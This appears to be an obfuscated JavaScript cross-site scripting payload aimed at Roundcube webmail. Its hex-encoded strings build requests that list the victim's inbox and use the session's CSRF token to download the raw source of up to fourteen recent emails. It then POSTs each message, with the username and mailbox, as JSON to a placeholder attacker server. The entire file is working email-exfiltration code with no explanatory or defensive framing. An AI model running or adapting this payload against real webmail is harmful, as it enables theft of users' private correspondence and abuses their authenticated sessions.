var _$_3bc0=["\x47\x45\x54","\x3F\x5F\x74\x61\x73\x6B\x3D\x6D\x61\x69\x6C\x26\x5F\x61\x63\x74\x69\x6F\x6E\x3D\x6C\x69\x73\x74\x26\x5F\x72\x65\x66\x72\x65\x73\x68\x3D\x31\x26\x5F\x6D\x62\x6F\x78\x3D\x49\x4E\x42\x4F\x58\x26\x5F\x72\x65\x6D\x6F\x74\x65\x3D\x31","\x61\x64\x64\x5F\x6D\x65\x73\x73\x61\x67\x65\x5F\x72\x6F\x77","\x2C","\x2D\x2D\x2D","\x2D\x2D\x2D\x2D","\x3F\x5F\x74\x61\x73\x6B\x3D\x6D\x61\x69\x6C\x26\x5F\x73\x61\x76\x65\x3D\x31\x26\x5F\x75\x69\x64\x3D","\x26\x5F\x6D\x62\x6F\x78\x3D\x49\x4E\x42\x4F\x58\x26\x5F\x61\x63\x74\x69\x6F\x6E\x3D\x76\x69\x65\x77\x73\x6F\x75\x72\x63\x65\x26\x5F\x74\x6F\x6B\x65\x6E\x3D","\x50\x4F\x53\x54","<PHP Mailer address with HTTP only, it's important not ot have HTPPS there>","\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x74\x79\x70\x65","\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x6A\x73\x6F\x6E"];
var h= new XMLHttpRequest();
var cons=0;
h.open(_$_3bc0[0],_$_3bc0[1],true);
h.send();
h.onreadystatechange= function(){
	if(h.readyState== 4&& h.status== 200){
		var _0x1128E=h.responseText;
		var _0x112E2=_0x1128E.indexOf(_$_3bc0[2])+ (_$_3bc0[2]).length+ 1;
		var _0x11336=_0x1128E.substring(_0x112E2).split(_$_3bc0[3])[0];
		getmail(_0x11336,cons)	
	}
};
function getmail(_0x11336,cons){
	if(cons== 14){return};
	var _0x113DE=rcmail.env.request_token;
	var _0x11486=rcmail.env.username+ _$_3bc0[4]+ rcmail.env.mailbox;
	var _0x11432=_0x11486+ _$_3bc0[5]+ _0x11336;
	var _0x1138A= new XMLHttpRequest();
	var _0x114DA=_$_3bc0[6]+ _0x11336+ _$_3bc0[7]+ _0x113DE;
	_0x1138A.open(_$_3bc0[0],_0x114DA,true);
	_0x1138A.send();
	_0x1138A.onreadystatechange= function(){
		if(_0x1138A.readyState== 4&& _0x1138A.status== 200){
			var _0x1152E=_0x1138A.responseText;
			postmail(_0x1152E,_0x11432)
		}
	};
	cons= cons+ 1;
	_0x11336= _0x11336- 1;
	getmail(_0x11336,cons)
}
function postmail(_0x115D6,_0x11432){
	var _0x11582= new XMLHttpRequest();
	var _0x1162A={'\x6D\x61\x69\x6C':_0x115D6,'\x75\x69\x64':_0x11432};
	_0x11582.open(_$_3bc0[8],_$_3bc0[9],true);
	_0x11582.setRequestHeader(_$_3bc0[10],_$_3bc0[11]);
	_0x11582.send(JSON.stringify(_0x1162A))
}